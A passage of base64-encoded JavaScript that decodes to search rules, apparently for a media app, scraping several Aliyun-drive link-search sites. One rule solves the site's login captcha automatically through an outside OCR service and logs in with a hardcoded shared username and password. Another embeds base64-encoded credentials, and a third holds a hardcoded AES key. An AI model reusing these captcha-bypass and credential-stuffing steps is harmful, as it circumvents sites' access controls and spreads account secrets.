gICAgICAgfSk7XFxuICAgICAgICAgICAgbGV0IGFyciA9IHBkZmEoaHRtbCwgXFxcIiNhcHAmJmFcXFwiKTtcXG4gICAgICAgICAgICAvL2xvZyhhcnIpO1xcbiAgICAgICAgICAgIGxldCBkID0gW107XFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXG4gICAgICAgICAgICAgICAgbGV0IGl0ID0gXFxcIjxkaXY+XFxcIiArIGFycltpXSArIFxcXCI8L2Rpdj5cXFwiO1xcbiAgICAgICAgICAgICAgICBsZXQgdSA9IHBkZmgoaXQsIFxcXCJhJiZocmVmXFxcIik7XFxuICAgICAgICAgICAgICAgIC8vbG9nKHUpO1xcbiAgICAgICAgICAgICAgICBpZiAoIXUuaW5jbHVkZXMoXFxcIi9zL1xcXCIpKSB7XFxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICB1ID0gXFxcImh0dHBzOi8vd3d3LmFsaXBhbnNvdS5jb21cXFwiICsgdS5yZXBsYWNlKFxcXCIvcy9cXFwiLCBcXFwiL2N2L1xcXCIpO1xcbiAgICAgICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHBkZmgoaXQsIFxcXCJ0ZW1wbGF0ZSYmVGV4dFxcXCIpLFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiB1LFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogcGRmaChpdCwgXFxcInRlbXBsYXRlLDEmJlRleHRcXFwiKSxcXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHJldHVybiBkO1xcbiAgICAgICAgfSxcXG4gICAgICAgIGZpbmRBbGlVcmwoaW5wdXQpIHtcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QoaW5wdXQsIHtcXG4gICAgICAgICAgICAgICAgaGVhZGVyczoge1xcbiAgICAgICAgICAgICAgICAgICAgXFxcIkNvb2tpZVxcXCI6IFxcXCJub19zaG93X2RvbmF0ZT0xXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJSZWZlcmVyXFxcIjogaW5wdXQucmVwbGFjZShcXFwiL2N2L1xcXCIsIFxcXCIvcy9cXFwiKVxcbiAgICAgICAgICAgICAgICB9LFxcbiAgICAgICAgICAgICAgICByZWRpcmVjdDogZmFsc2VcXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICBodG1sID0gcGFyc2VEb21Gb3JIdG1sKGh0bWwsICdhJiZocmVmJyk7XFxuICAgICAgICAgICAgaWYgKGh0bWwubGVuZ3RoID4gMCkge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gaHRtbDtcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gaW5wdXQ7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICB9LFxcbiAgICB7XFxuICAgICAgICBuYW1lOiBcXFwi5piT5pCcXFxcIixcXG4gICAgICAgIHBhZ2U6IHRydWUsXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxuICAgICAgICAgICAgbGV0IGFsaVV0aWwgPSAkLnJlcXVpcmUoXFxcImFsaVV0aWxcXFwiKTtcXG4gICAgICAgICAgICBsZXQgQ3J5cHRvSlMgPSBhbGlVdGlsLmdldENyeXB0b0pTKCk7XFxuXFxuICAgICAgICAgICAgZnVuY3Rpb24ga2V5ZW4oc3RyKSB7XFxuICAgICAgICAgICAgICAgIHZhciBrZXkgPSBDcnlwdG9KUy5lbmMuVXRmOC5wYXJzZShcXFwiNE9Ub1NjVUZPYWVWVHJIRVxcXCIpLFxcbiAgICAgICAgICAgICAgICAgICAgaXYgPSBDcnlwdG9KUy5lbmMuVXRmOC5wYXJzZShcXFwiOUNMR2FvMXZIS3FtMTdPelxcXCIpO1xcbiAgICAgICAgICAgICAgICB2YXIgZW5jcnlwdGVkID0gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoe1xcbiAgICAgICAgICAgICAgICAgICAgY2lwaGVydGV4dDogQ3J5cHRvSlMuZW5jLkJhc2U2NC5wYXJzZShzdHIpXFxuICAgICAgICAgICAgICAgIH0sIGtleSwge1xcbiAgICAgICAgICAgICAgICAgICAgaXY6IGl2LFxcbiAgICAgICAgICAgICAgICAgICAgbW9kZTogQ3J5cHRvSlMubW9kZS5DQkMsXFxuICAgICAgICAgICAgICAgICAgICBwYWRkaW5nOiBDcnlwdG9KUy5wYWQuUGtjczdcXG4gICAgICAgICAgICAgICAgfSkudG9TdHJpbmcoQ3J5cHRvSlMuZW5jLlV0ZjgpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gZW5jcnlwdGVkO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QoXFxcImh0dHBzOi8veWlzby5mdW4vYXBpL3NlYXJjaD9uYW1lPVxcXCIgKyBzICsgXFxcIiZwYWdlTm89XFxcIiArIHBhZ2UsIHtcXG4gICAgICAgICAgICAgICAgaGVhZGVyczoge1xcbiAgICAgICAgICAgICAgICAgICAgXFxcIlJlZmVyZXJcXFwiOiBcXFwiaHR0cHM6Ly95aXNvLmZ1bi9pbmZvP3NlYXJjaEtleT1cXFwiICsgcyxcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJDb29raWVcXFwiOiBnZXRJdGVtKCd5aXNvdWNvb2tlJywgJycpXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAvL2xvZyhodG1sKTtcXG4gICAgICAgICAgICBpZiAoaHRtbC5pbmNsdWRlcygn55m75b2V55So5oi35peg6ZmQ5Yi2JykpIHtcXG4gICAgICAgICAgICAgICAgdmFyIGkgPSAwO1xcbiAgICAgICAgICAgICAgICBkbyB7XFxuICAgICAgICAgICAgICAgICAgICB2YXIgdHlpbWdsaW4gPSAnaHR0cHM6Ly95aXNvLmZ1bi9hcGkvdXNlci9sb2dpbi9jYXB0Y2hhP3Q9JyArIHBhcnNlSW50KG5ldyBEYXRlKCkuZ2V0VGltZSgpKSArICcnO1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IGltZyA9IGNvbnZlcnRCYXNlNjRJbWFnZSh0eWltZ2xpbikuc3BsaXQoJywnKVsxXTtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBjb2QgPSByZXF1ZXN0KCdodHRwczovL2FwaS54aG9mZS50b3Avb2NyL2I2NC90ZXh0Jywge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICd0ZXh0L3BsYWluJ1xcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgICAgICAgICAgYm9keTogaW1nLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIG1ldGhvZDogJ1BPU1QnXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgICAgIHZhciB2ZXIgPSBKU09OLnBhcnNlKHJlcXVlc3QoJ2h0dHBzOi8veWlzby5mdW4vYXBpL3VzZXIvbG9naW4nLCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVyczoge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAncmVmZXJlcic6ICdodHRwczovL3lpc28uZnVuL2xvZ2luJyxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0Nvb2tpZSc6IGdldENvb2tpZSh0eWltZ2xpbilcXG4gICAgICAgICAgICAgICAgICAgICAgICB9LFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGJvZHk6IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgXFxcInVzZXJOYW1lXFxcIjogXFxcInR2Ym94MjAyM1xcXCIsXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIFxcXCJwYXNzd29yZFxcXCI6IFxcXCJUdmJveDIwMjNcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBcXFwiY29kZVxcXCI6IGNvZFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgICAgICAgICAgbWV0aG9kOiAnUE9TVCdcXG4gICAgICAgICAgICAgICAgICAgIH0pKTtcXG4gICAgICAgICAgICAgICAgICAgIGlmICh2ZXIuY29kZSA9PSAyMDApIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBsb2coJ+aYk+aQnOeZu+WFpemqjOivgeaIkOWKnycpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHNldEl0ZW0oJ3lpc291Y29va2UnLCBnZXRDb29raWUoJ2h0dHBzOi8veWlzby5mdW4nKSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgaHRtbCA9IHJlcXVlc3QoXFxcImh0dHBzOi8veWlzby5mdW4vYXBpL3NlYXJjaD9uYW1lPVxcXCIgKyBzICsgXFxcIiZwYWdlTm89XFxcIiArIHBhZ2UsIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVyczoge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXFxcIlJlZmVyZXJcXFwiOiBcXFwiaHR0cHM6Ly95aXNvLmZ1bi9pbmZvP3NlYXJjaEtleT1cXFwiICsgcyxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFxcXCJDb29raWVcXFwiOiBnZXRJdGVtKCd5aXNvdWNvb2tlJywgJycpXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcXG4gICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgIGkrKztcXG4gICAgICAgICAgICAgICAgfSB3aGlsZSAoaSA8IDQpO1xcblxcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBsZXQgYXJyID0gSlNPTi5wYXJzZShodG1sKS5kYXRhLmxpc3Q7XFxuICAgICAgICAgICAgLy9sb2coYXJyKTtcXG4gICAgICAgICAgICBsZXQgZCA9IFtdO1xcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYXJyLmxlbmd0aDsgaSsrKSB7XFxuICAgICAgICAgICAgICAgIGxldCBpdCA9IGFycltpXTtcXG4gICAgICAgICAgICAgICAgbGV0IHUgPSBrZXllbihpdC51cmwpO1xcbiAgICAgICAgICAgICAgICAvL2xvZyh1KTtcXG4gICAgICAgICAgICAgICAgaWYgKHUgPT0gbnVsbCB8fCAhdS5pbmNsdWRlcyhcXFwiYWxpeXVuXFxcIikpIHtcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogaXQubmFtZSxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogdSxcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IChpdC5nbXRTaGFyZSB8fCBpdC5nbXRDcmVhdGUpICsgXFxcIlxcXFxuXFxcIiArICh1KSxcXG4gICAgICAgICAgICAgICAgfSk7XFxuXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHJldHVybiBkO1xcbiAgICAgICAgfVxcbiAgICB9LFxcbiAgICB7XFxuICAgICAgICBuYW1lOiBcXFwi5om+6LWE5rqQXFxcIixcXG4gICAgICAgIHBhZ2U6IHRydWUsXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxuICAgICAgICAgICAgZnVuY3Rpb24gZ2V0aHRtbCgpIHtcXG4gICAgICAgICAgICAgICAgbGV0IGh0bWwgPSByZXF1ZXN0KFxcXCJodHRwczovL3poYW96aXl1YW4ubWUvc28/ZmlsZW5hbWU9XFxcIiArIHMgKyBcXFwiJnBhZ2U9XFxcIiArIHBhZ2UsIHtcXG4gICAgICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBcXFwiUmVmZXJlclxcXCI6IFxcXCJodHRwczovL3poYW96aXl1YW4ubWUvc3RvcC5odG1sXFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICBcXFwib3JpZ2luXFxcIjogXFxcImh0dHBzOi8vemhhb3ppeXVhbi5tZVxcXCIsXFxuICAgICAgICAgICAgICAgICAgICAgICAgXFxcIkNvb2tpZVxcXCI6IGdldEl0ZW0oXFxcInp6eWNvb2tlXFxcIiwgXFxcIlxcXCIpLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIFxcXCJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzXFxcIjogXFxcIjFcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIFxcXCJjb250ZW50LXR5cGVcXFwiOiBcXFwiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkXFxcIlxcbiAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGh0bWw7XFxuICAgICAgICAgICAgfTtcXG4gICAgICAgICAgICB2YXIgaHRtbCA9IGdldGh0bWwoKTtcXG4gICAgICAgICAgICBpZiAoIWh0bWwuaW5jbHVkZXMoXFxcInNlYXJjaF9ib3hcXFwiKSkge1xcbiAgICAgICAgICAgICAgICBsZXQgdXNlciA9ICdkWE5sY201aGJXVTllWEJxTWpBeU15WndZWE56ZDI5eVpEMTVjR295TURJeic7XFxuICAgICAgICAgICAgICAgIGxldCBjb29rID0gSlNPTi5wYXJzZShmZXRjaENvb2tpZSgnaHR0cHM6Ly96aGFveml5dWFuLm1lL2xvZ2l1Lmh0bWwnLCB7XFxuICAgICAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiBNT0JJTEVfVUEsXFxuICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICdPcmlnaW4nOiAnaHR0cHM6Ly96aGFveml5dWFuLm1lJyxcXG4gICAgICAgICAgICAgICAgICAgICAgICAnUmVmZXJlcic6ICdodHRwczovL3poYW96aXl1YW4ubWUvbG9naW4uaHRtbCcsXFxuICAgICAgICAgICAgICAgICAgICAgICAgXFxcInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHNcXFwiOiBcXFwiMVxcXCJcXG4gICAgICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgICAgICBib2R5OiBiYXNlNjREZWNvZGUodXNlciksXFxuICAgICAgICAgICAgICAgICAgICBtZXRob2Q6ICdQT1NUJyxcXG4gICAgICAgICAgICAgICAgICAgIG9ubHlIZWFkZXJzOiB0cnVlLFxcbiAgICAgICAgICAgICAgICAgICAgd2l0aEhlYWRlcnM6IHRydWVcXG4gICAgICAgICAgICAgICAgfSkpLmpvaW4oJzsnKTtcXG4gICAgICAgICAgICAgICAgc2V0SXRlbShcXFwienp5Y29va2VcXFwiLCBjb29rKTtcXG4gICAgICAgICAgICAgICAgbG9nKFxcXCLmib7otYTmupDnmbvlhaVcXFwiKTtcXG4gICAgICAgICAgICAgICAgaHRtbCA9IGdldGh0bWwoKTtcXG4gICAgICAgICAgICB9XFxuXFxuICAgICAgICAgICAgbGV0IGFyciA9IHBkZmEoaHRtbCwgXFxcImJvZHkmJi5uZXdzTGlzdCYmbGk6bm90KDpmaXJzdC1jaGlsZClcXFwiKTtcXG4gICAgICAgICAgICAvL2xvZyhhcnIpO1xcbiAgICAgICAgICAgIGxldCBkID0gW107XFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXG4gICAgICAgICAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcbiAgICAgICAgICAgICAgICBsZXQgdSA9IHBkZmgoaXQsIFxcXCJhJiZocmVmXFxcIik7XFxuICAgICAgICAgICAgICAgIGlmICh1ID09IG51bGwpIHtcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIHUgPSBcXFwiaHR0cHM6Ly96aGFveml5dWFuLm1lL1xcXCIgKyB1O1xcbiAgICAgICAgICAgICAgICAvL2xvZyh1KTtcXG4gICAgICAgICAgICAgICAgbGV0IHRpdGxlID0gcGRmaChpdCwgXFxcIi5uZXdzX3RleHQmJmgzJiZUZXh0XFxcIik7XFxuICAgICAgICAgICAgICAgIGlmICghdGl0bGUpIGNvbnRpbnVlO1xcbiAgICAgICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHRpdGxlLFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogcGRmaChpdCwgXFxcIi5uZXdzX3RleHQmJnAmJlRleHRcXFwiKSxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogdVxcbiAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgcmV0dXJuIGQ7XFxuICAgICAgICB9LFxcbiAgICAgICAgZmluZEFsaVVybChpbnB1dCkge1xcbiAgICAgICAgICAgIGxldCBodG1sID0gcmVxdWVzdChpbnB1dCk7XFxuICAgICAgICAgICAgdmFyIF9saW5rcyA9IGh0bWwubWF0Y2goL2h0dHBzOlxcXFwvXFxcXC8od3d3XFxcXC5hbGl5dW5kcml2ZVxcXFwuY29tXFxcXC9zfGFseXdwXFxcXC5uZXQpXFxcXC9cXFxcdyovZykgfHwgW107XFxuXFxuICAgICAgICAgICAgaWYgKF9saW5rcy5sZW5ndGggPiAwKSB7XFxuXFxuICAgICAgICAgICAgICAgIHJldHVybiBfbGlua3NbMF07XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGlucHV0O1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgfSxcXG4gICAge1xcbiAgICAgICAgbmFtZTogXFxcIuWwj+e6uOadoVxcXCIsXFxuICAgICAgICBwYWdlOiBmYWxzZSxcXG4gICAgICAgIGZpbmQ6IGZ1bmN0aW9uKHMsIHBhZ2UpIHtcXG4gICAgICAgICAgICBsZXQgYWxpVXRpbCA9ICQucmVxdWlyZShcXFwiYWxpVXRpbFxcXCIpO1xcblxcbiAgICAgICAgICAgIGZ1bmN0aW9uIGdldHRva2VuKCkge1xcbiAgICAgICAgICAgICAgICBpZiAoZ2V0TXlWYXIoJ3h6eXRva2VuJywgJycpLmxlbmd0aCA9PSAwKSB7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgdG9rZW4gPSBKU09OLnBhcnNlKHBvc3QoJ2h0dHBzOi8vZ2l0Y2FmZS5uZXQvdG9vbC9hbGlwYXBlci8nLCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVyczoge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnUmVmZXJlcic6ICdodHRwczovL3UuZ2l0Y2FmZS5pbmsvJ1xcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgICAgICAgICAgYm9keToge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb246ICdnZXRfdG9rZW4nXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgfSkpLmRhdGE7XFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcigneHp0dG9rZW4nLCB0b2tlbik7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgcmV0dXJuIGdldE15VmFyKCd4enR0b2tlbicsICcnKTtcXG4gICAgICAgICAgICB9XFxuXFxuICAgICAgICAgICAgZnVuY3Rpb24gY2F0X2NvZGUoYSkge1xcbiAgICAgICAgICAgICAgICB2YXIgZCwgZSwgYiA9IFtcXFwi5Y2O6K+t55S16KeGXFxcIiwgXFxcIuaXpemfqeeUteinhlxcXCIsIFxcXCLmrKfnvo7nlLXop4ZcXFwiLCBcXFwi5YW25LuW55S16KeGXFxcIiwgXFxcIuWNjuivreeUteW9sVxcXCIsIFxcXCLml6Xpn6nnlLXlvbFcXFwiLCBcXFwi5qyn576O55S15b2xXFxcIiwgXFxcIuWFtuS7lueUteW9sVxcXCIsIFxcXCLljY7or63liqjmvKtcXFwiLCBcXFwi5pel6Z+p5Yqo5ryrXFxcIiwgXFxcIuasp+e+juWKqOa8q1xcXCIsIFxcXCLnuqrlvZXniYdcXFwiLCBcXFwi57u86Im654mHXFxcIiwgXFxcIuaVmeiCsuWfueiurVxcXCIsIFxcXCLlhbbku5bop4bpopFcXFwiLCBcXFwi5Y2O6K+t6Z+z5LmQXFxcIiwgXFxcIuaXpemfqemfs+S5kFxcXCIsIFxcXCLmrKfnvo7pn7PkuZBcXFwiLCBcXFwi5YW25LuW6Z+z5LmQXFxcIiwgXFxcIuWoseS5kOi9r+S7tlxcXCIsIFxcXCLns7vnu5/ova/ku7ZcXFwiLCBcXFwi572R57uc6L2v5Lu2XFxcIiwgXFxcIuWKnuWFrOi9r+S7tlxcXCIsIFxcXCLlhbbku5bova/ku7ZcXFwiLCBcXFwi5ryr55S7XFxcIiwgXFxcIuWwj+ivtFxcXCIsIFxcXCLlh7rniYjkuaZcXFwiLCBcXFwi55+l6K+G5Z+56K6tXFxcIiwgXFxcIuWFtuS7luaWh+aho1xcXCIsIFxcXCLlo4HnurhcXFwiLCBcXFwi5Lq654mpXFxcIiwgXFxcIumjjuaZr1xcXCIsIFxcXCLlhbbku5blm77niYdcXFwiLCBcXFwi5YW25LuWXFxcIl0sXFxuICAgICAgICAgICAgICAgICAgICBjID0gW1xcXCJoeWRzXFxcIiwgXFxcInJoZHNcXFwiLCBcXFwib21kc1xcXCIsIFxcXCJxdGRzXFxcIiwgXFxcImh5ZHlcXFwiLCBcXFwicmhkeVxcXCIsIFxcXCJvbWR5XFxcIiwgXFxcInF0ZHlcXFwiLCBcXFwiaHlkbVxcXCIsIFxcXCJyaGRtXFxcIiwgXFxcIm9tZG1cXFwiLCBcXFwiamxwXFxcIiwgXFxcInp5cFxcXCIsIFxcXCJqeXB4XFxcIiwgXFxcInF0c3BcXFwiLCBcXFwiaHl5eVxcXCIsIFxcXCJyaHl5XFxcIiwgXFxcIm9teXlcXFwiLCBcXFwicXR5eVxcXCIsIFxcXCJrZnJqXFxcIiwgXFxcInh0cmpcXFwiLCBcXFwid2xyalxcXCIsIFxcXCJiZ3JqXFxcIiwgXFxcInF0cmpcXFwiLCBcXFwibWhcXFwiLCBcXFwieHNcXFwiLCBcXFwiY2JzXFxcIiwgXFxcInpzcHhcXFwiLCBcXFwicXR3ZFxcXCIsIFxcXCJielxcXCIsIFxcXCJyd1xcXCIsIFxcXCJmalxcXCIsIFxcXCJxdHRwXFxcIiwgXFxcInF0XFxcIl07XFxuICAgICAgICAgICAgICAgIGZvciAoZCA9IDAsIGUgPSBjLmxlbmd0aDsgZSA+IGQ7IGQrKylcXG4gICAgICAgICAgICAgICAgICAgIGlmIChjW2RdID09IGEpIHJldHVybiBiW2RdO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBsZXQgZCA9IFtdO1xcbiAgICAgICAgICAgIGxldCBodG1sID0gcG9zdChcXFwiaHR0cHM6Ly9naXRjYWZlLm5ldC90b29sL2FsaXBhcGVyL1xcXCIsIHtcXG4gICAgICAgICAgICAgICAgaGVhZGVyczoge1xcbiAgICAgICAgICAgICAgICAgICAgJ1JlZmVyZXInOiAnaHR0cHM6Ly91LmdpdGNhZmUuaW5rLydcXG4gICAgICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICAgICAgYm9keToge1xcbiAgICAgICAgICAgICAgICAgICAgYWN0aW9uOiBcXFwic2VhcmNoXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIGZyb206IFxcXCJ3ZWJcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgdG9rZW46IGdldHRva2VuKCksXFxuICAgICAgICAgICAgICAgICAgICBrZXl3b3JkOiBzXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgICAgIGxldCBsaXN0ID0gSlNPTi5wYXJzZShodG1sKTtcXG4gICAgICAgICAgICBpZiAobGlzdC5kYXRhKSB7XFxuICAgICAgICAgICAgICAgIGxpc3QgPSBsaXN0LmRhdGE7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGlzdC5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgICAgICAgICBsZXQgaXQgPSBsaXN0W2ldXFxuICAgICAgICAgICAgICAgIGxldCB0aXRsZSA9IGl0LnRpdGxlO1xcbiAgICAgICAgICAgICAgICBsZXQgbXVybCA9ICdodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vcy8nICsgaXQuYWxpa2V5XFxuICAgICAgICAgICAgICAgIGlmICghYWxpVXRpbC5jaGVja2FsaShtdXJsKSkge1xcbiAgICAgICAgICAgICAgICAgICAgY29udGludWU7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgaWYgKHRpdGxlLmluY2x1ZGVzKHMpKSB7XFxuICAgICAgICAgICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi4oiaIFxcXCIgKyB0aXRsZSxcXG4gICAgICAgICAgICAgICAgICAgICAgICBkZXNjOiBjYXRfY29kZShpdC5jYXQpLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlczogaXQuZGVzXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICAgICAgICAgICAgICB1cmw6IG11cmxcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHJldHVybiBkO1xcbiAgICAgICAgfVxcbiAgICB9LFxcbiAgICB7XFxuICAgICAgICBuYW1lOiBcXFwi546p5YG25ZOl5ZOlXFxcIixcXG4gICAgICAgIHBhZ2U6IHRydWUsXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxuICAgICAgICAgICAgbGV0IHVybCA9IFxcXCJodHRwOi8vd29nZy54eXovaW5kZXgucGhwL3ZvZHNlYXJjaC9cXFwiICsgcyArIFxcXCItLS0tLS0tLS0tXFxcIiArIHBhZ2UgKyBcXFwiLS0tLmh0bWxcXFwiO1xcbiAgICAgICAgICAgIGxldCBodG1sID0gcmVxdWVzdCh1cmwsIHt9KTtcXG4gICAgICAgICAgICBsZXQgYXJyID0gcGFyc2VEb21Gb3JBcnJheShodG1sLCAnLm1vZHVsZS1pdGVtcyYmLm1vZHVsZS1zZWFyY2gtaXRlbScpO1xcbiAgICAgICAgICAgIC8vbG9nKGFycik7XFxuICAgICAgICAgICAgbGV0IGQgPSBbXTtcXG4gICAgICAgICAgICBsZXQgYmV0ID0gW107XFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXG4gICAgICAgICAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcbiAgICAgICAgICAgICAgICBsZXQgdXRpdGxlID0gcGFyc2VEb21Gb3JIdG1sKGl0LCAnaDMmJmEmJlRleHQnKTtcXG4gICAgICAgICAgICAgICAgbGV0IHVzZXJpYWwgPSBwYXJzZURvbUZvckh0bWwoaXQsICcudmlkZW8tc2VyaWFsJiZUZXh0Jyk7XFxuICAgICAgICAgICAgICAgIGxldCB1aW1hZ2UgPSBwYXJzZURvbShpdCwgJy5sYXp5bG9hZCYmZGF0YS1zcmMnLCAnaHR0cDovL3dvZ2cueHl6LycpO1xcbiAgICAgICAgICAgICAgICBsZXQgdSA9IHBhcnNlRG9tKGl0LCAnaDMmJmEmJmhyZWYnLCAnaHR0cDovL3dvZ2cueHl6LycpO1xcbiAgICAgICAgICAgICAgICAvL2xldCBkZXQgPSByZXF1ZXN0KHUsIHt9KTtcXG4gICAgICAgICAgICAgICAgYmV0LnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHV0aXRsZSxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogdSxcXG4gICAgICAgICAgICAgICAgICAgIGltYWdlOiB1aW1hZ2UsXFxuICAgICAgICAgICAgICAgICAgICBkZXNjOiB1c2VyaWFsXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBpZiAoYmV0Lmxlbmd0aCA+IDApIHtcXG4gICAgICAgICAgICAgICAgbGV0IGJldGggPSBiYXRjaEZldGNoKGJldCk7XFxuICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYmV0aC5sZW5ndG